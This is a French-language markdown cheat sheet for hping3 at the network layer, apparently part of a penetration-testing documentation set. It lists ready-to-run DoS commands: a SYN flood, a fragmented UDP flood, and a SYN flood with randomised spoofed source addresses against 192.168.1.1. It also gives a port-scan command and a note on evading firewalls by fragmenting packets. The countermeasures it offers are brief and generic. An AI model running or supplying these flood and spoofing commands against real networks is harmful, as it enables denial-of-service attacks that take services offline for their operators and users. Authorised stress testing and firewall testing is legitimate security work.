## 4. `docs/Couche3_Reseau/cheat-couche3.md`

```markdown
# Couche 3 (Réseau) – Hping3
**Version Testée : Hping3 3.0.x**  
**Attaque Ciblée : DDoS (flood TCP/UDP/ICMP) & Tests de Firewall**

*Document intégrant des annotations pour l’automatisation et la génération de rapports via le script.*

---

## Sommaire

1. [Introduction](#introduction)
2. [Installation & Pré-requis](#installation--pré-requis)
3. [Commandes Clés](#commandes-clés)
4. [Exemples d’Attaques](#exemples-dattaques)
5. [Limitations & Contre-mesures](#limitations--contre-mesures)
6. [Intégration avec le Script](#intégration-avec-le-script)
7. [Références & Ressources](#références--ressources)

---

## Introduction

Hping3 est un outil puissant pour manipuler des paquets TCP/IP. Il est utilisé pour :
- Tester la robustesse des firewalls (via fragmentation, flags spécifiques).
- Lancer des attaques DoS telles que SYN flood ou UDP flood.
- Réaliser des analyses de performance (ping avancé, traceroute).

---

## Installation & Pré-requis

- **Sur Debian/Ubuntu :**
```bash
sudo apt update
sudo apt install hping3
•	Privilèges :
Exécution en tant qu’utilisateur avec droits suffisants selon les tests réalisés.
________________________________________
Commandes Clés
1. SYN Flood
hping3 -S -p 80 --flood -d 1000 192.168.1.1
Détails :
•	-S active le flag SYN.
•	--flood pour un envoi continu.
•	-d 1000 définit la taille du paquet.
2. UDP Flood avec fragmentation
hping3 --udp -p 53 --frag -d 2000 --flood 192.168.1.1
Détails :
•	--udp active le mode UDP.
•	--frag active la fragmentation.
•	-d 2000 définit le payload.
3. IP Spoofing avec adresses sources aléatoires
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
Détails :
•	-c 10000 indique le nombre de paquets.
•	--rand-source génère des adresses IP sources aléatoires.
________________________________________
Exemples d’Attaques
•	Découverte de ports :
hping3 -S <IP_CIBLE> --scan 1-1000
•	Évasion de firewall :
En fragmentant les paquets ou en modifiant les flags pour contourner le filtrage.
________________________________________
Limitations & Contre-mesures
•	Limitations : 
o	Dépend de la bande passante de l’attaquant.
o	Détectable par des équipements de sécurité modernes.
•	Contre-mesures : 
o	Déployer des solutions anti-DDoS et de filtrage de paquets.
o	Utiliser des systèmes IDS/IPS pour surveiller les anomalies.
________________________________________
Intégration avec le Script
•	Annotations :
Le script analysera chaque commande exécutée, enregistrera les paramètres et générera un rapport d’activité complet.
•	Suivi des actions :
Les logs d’exécution seront intégrés pour un récapitulatif automatisé.
________________________________________
Références & Ressources
•	Site Officiel d’Hping3
•	GitHub Hping
•	RFC 791 (IP)
•	RFC 793 (TCP)

---
